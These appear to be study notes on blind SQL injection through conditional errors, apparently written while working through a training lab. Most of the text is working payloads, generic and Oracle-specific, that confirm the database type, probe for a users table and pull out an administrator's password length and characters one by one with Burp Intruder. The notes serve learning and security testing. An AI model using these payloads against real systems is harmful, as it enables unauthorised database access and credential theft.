     

## Inducing conditional responses by triggering SQL errors

  
The results of the SQL query are not returned, which means we cannot use UNION based SQLi. And the application does not respond any differently based on whether the query returns any rows, which means we cannot use Blind based SQLi based on Conditional Responses. If the SQL query causes an error, then the application returns a custom error message, which means we can use Blind based SQLi based on Conditional Errors.  

   In this situation, it is often possible to induce the application 		to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.   
   
To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:   
<font color=ligreen>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a  
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a </font>

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.   

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:   
<font color=ligreen>xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a   
  

### Note :  
  
There are various ways of triggering conditional errors, and different techniques work best on different database types.  
	
`Oracle database need FROM clause and needs || instead of +   `
  
  
	Inducing conditional responses by triggering SQL errors in Oracle Database  
<font color=ligreen>
	‘|| (select ’' from dual)--    //to confirm its a oracle database  

<font color=ligreen>	‘ || (select ’' from users where rownum=1)- </font>- ``//checking whether the users table exists and using rownum=1 inorder to ensure it outputs only 1 entry and not crash the sql query by ouputting all entires in row `` 

<font color=ligreen>	‘ || (select ’' from users where username='administrator')-- ``//this doesnt work and doesnt even errors out even if administrator user exists or not in users table, so this a bad way  ``

<font color=ligreen>	‘ || (select CASE WHEN (1=1) THEN to_char(1/0) ELSE ‘’ END from dual)--  

<font color=ligreen>	‘ || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ’' END FROM users where username='administrator') || ‘ ``//we need to understand the order of execution in sql, i.e. first of all from FROM users where username=’administrator' will be executed and if username do exists then the select portion of code will be executed, returning error.  ``

	But if username doesnt exists then the select portion wont be executed returning 200OK  

<font color=ligreen>	‘ || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ’' END FROM users where username='administrator' and LENGTH(password)=5) || ‘ ``//we can use burp intruder to know the password length  ``

<font color=ligreen>	‘ || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ’' END FROM users where username='administrator' and substr(password,1,1)='a') || ‘ `//we can user burp intruder and clusterbomb style for the 1 and ‘a’ iteration`